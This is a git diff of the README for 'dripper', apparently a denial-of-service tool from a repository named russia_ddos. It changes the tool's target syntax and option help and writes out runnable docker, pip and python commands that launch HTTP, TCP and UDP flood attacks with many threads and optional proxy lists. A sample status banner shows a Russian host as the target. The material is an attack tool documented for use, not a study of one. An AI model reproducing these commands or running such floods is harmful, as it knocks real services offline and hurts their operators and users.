@@ -38,7 +38,7 @@ This script support HTTP/TCP/UDP flood attack. We recommend using this script fo
   Start Time                        2022-02-24 04:00:00                         
   Your Public IP / Country          131.*.*.* / AR                              
   Host IP / Country                 192.168.0.1:80 / RU                        
-  Load Method                       UDP                                         
+  Attack Method                     UDP-FLOOD                                         
  ────────────────────────────────────────────────────────────────────────────── 
   Threads                           50                                          
   vCPU Count                        16                                          
@@ -88,18 +88,16 @@ Usage: dripper [options] arg
 
 Options:
   -h, --help            show this help message and exit
-  -p PORT, --port=PORT (default: 80)
-                        Port number.
+  -s TARGET, --target=TARGET
+                        Attack target in {scheme}://{hostname}[:{port}][{path}] format
   -t THREADS, --threads=THREADS (default: 100)
                         Threads count.
   -r RANDOM_PACKET_LEN, --random_len=RANDOM_PACKET_LEN (default: 1)
-                        Send random packets with random length .
+                        Send random packets with random length. Turn on: 1, turn off: 0.
   -l MAX_RANDOM_PACKET_LEN, --max_random_packet_len=MAX_RANDOM_PACKET_LEN
                         Max random packets length (default: 48 for udp, 1000 for tcp, 0 for http).
-  -m ATTACK_METHOD, --method=ATTACK_METHOD (default: udp)
-                        Attack method: udp, tcp, http.
-  -s HOST, --server=HOST
-                        Attack to server IP.
+  -m ATTACK_METHOD, --method=ATTACK_METHOD
+                        Attack method: udp-flood, tcp-flood, http-flood. Could be auto-detected based on the scheme (protocol) of the target.
   -y FILENAME, --proxy_list=FILENAME
                         File (fs or http/https) with proxies in ip:port:username:password or ip:port line format.
                         Proxies will be ignored in udp attack!
@@ -109,11 +107,10 @@ Options:
   -c STATE, --health_check=STATE (default: 1)
                         Controls health check availability. Turn on: 1, turn off: 0.
   -e HTTP_METHOD, --http_method=HTTP_METHOD (default: GET)
-  -a HTTP_PATH, --http_path=HTTP_PATH (default: /)
   -o SOCKET_TIMEOUT, --socket_timeout=SOCKET_TIMEOUT (default: 10 without proxy, 20 with proxy)
                         Timeout in seconds for socket connection is seconds.
 
-Example: dripper -s 192.168.0.1 -p 80 -t 100
+Example: dripper -s http://192.168.0.1 -t 100
 ```
 
 ## How to Run
@@ -122,13 +119,17 @@ Example: dripper -s 192.168.0.1 -p 80 -t 100
 
 ```bash
 # HTTP flood
-docker run -it --rm alexmon1989/dripper:latest -s 127.0.0.1 -p 80 -t 100 -m http
+docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1:80 -t 100 -m http-flood
+# or
+docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1:80 -t 100
+# or even
+docker run -it --rm alexmon1989/dripper:latest -s http://127.0.0.1 -t 100
 
 # TCP flood
-docker run -it --rm alexmon1989/dripper:latest -s 127.0.0.1 -p 80 -t 100 -m tcp -l 2048
+docker run -it --rm alexmon1989/dripper:latest -s tcp://127.0.0.1:80 -t 100 -l 2048
 
 # UDP flood
-docker run -it --rm alexmon1989/dripper:latest -s 127.0.0.1 -p 80 -t 100 -m upd -l 2048
+docker run -it --rm alexmon1989/dripper:latest -s udp://127.0.0.1:80 -t 100 -l 2048
 ```
 
 #### Directly with Python.
@@ -142,7 +143,7 @@ cd russia_ddos
 # Install dependencies
 python3 -m pip install --upgrade pip git+https://github.com/alexmon1989/russia_ddos.git
 # Run script
-dripper -s 127.0.0.1 -p 80 -t 100 -r 1 -m udp
+dripper -s udp://127.0.0.1:80 -t 100 -r 1
 
 
 # ===== Alternative variant =====
@@ -150,7 +151,7 @@ dripper -s 127.0.0.1 -p 80 -t 100 -r 1 -m udp
 # Install python dependencies:
 pip install -r requirements.txt
 # Run script
-python3 -m ripper.services -s 127.0.0.1 -p 80 -t 100 -r 1 -m udp
+python3 -m ripper.services -s udp://127.0.0.1:80 -t 100 -r 1
 ```
 
 #### Kubernetes
